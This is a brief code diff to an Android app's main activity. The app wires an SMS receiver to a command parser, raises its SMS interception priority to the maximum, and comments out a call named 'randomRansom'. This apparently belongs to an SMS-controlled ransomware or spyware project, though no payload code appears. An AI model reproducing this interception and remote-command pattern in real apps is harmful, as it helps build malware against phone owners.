@@ -31,7 +31,7 @@ public class MainActivity extends Activity implements Commandable {
 	private SMSCommandParser parser;
 	private SMSReceiver receiver;
 	private IntentFilter filter;
-	
+		
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		setContentView(R.layout.activity_main);
@@ -41,11 +41,12 @@ public class MainActivity extends Activity implements Commandable {
 		receiver = new SMSReceiver();
 		receiver.addConsumer(parser);
 
-		filter = new IntentFilter();
-		filter.addAction("android.provider.Telephony.SMS_RECEIVED");
+		filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
+		filter.setPriority(Integer.MAX_VALUE);
+		
 		registerReceiver(receiver, filter);
 		
-		this.randomRansom();
+		/*this.randomRansom();*/
 	}
 	
 	protected void onRestart(){
